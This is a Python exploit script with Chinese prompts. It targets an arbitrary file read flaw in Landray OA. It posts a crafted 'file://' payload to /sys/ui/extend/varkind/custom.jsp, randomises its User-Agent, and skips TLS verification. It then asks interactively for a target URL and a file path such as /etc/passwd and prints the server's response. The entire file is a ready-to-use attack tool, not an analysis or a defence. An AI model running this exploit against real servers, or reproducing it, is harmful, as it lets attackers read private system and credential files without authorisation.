#!/usr/bin/python3
#-*- coding:utf-8 -*-

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion:    蓝凌OA 任意文件读取漏洞                                          \033[0m')
    print('+  \033[36m使用格式:   python3 exp.py                                            \033[0m')
    print('+  \033[36mUrl:        http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')
    
    
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua 



def POC_1(target_url):
    vuln_url = target_url + "/sys/ui/extend/varkind/custom.jsp"
    headers = {
                "User-Agent": get_ua(),
                "Content-Type": "application/x-www-form-urlencoded"
    }
    while True:
        filename = str(input("\033[35m请输入需要读取的文件根路径+文件名(如：/etc/passwd)：\033[0m"))
        if filename == "exit":
            break
        data = 'var={"body":{"file":"file://'+filename+'"}}'
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
            print("\033[36m[+] 正在请求 {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(target_url))
            if "root:" in response.text and response.status_code == 200:
                print("\033[36m[+] 成功读取"+filename+"\n[+] 响应为:{} \033[0m".format(response.text))
        except Exception as e:
            print("\033[31m[x] 请求失败:{} \033[0m".format(e))
            
if __name__ == '__main__':
    title()
    while True:
        target_url = str(input("\033[35m请输入需要检测的url：\033[0m"))
        if target_url == "exit":
            break
        POC_1(target_url)
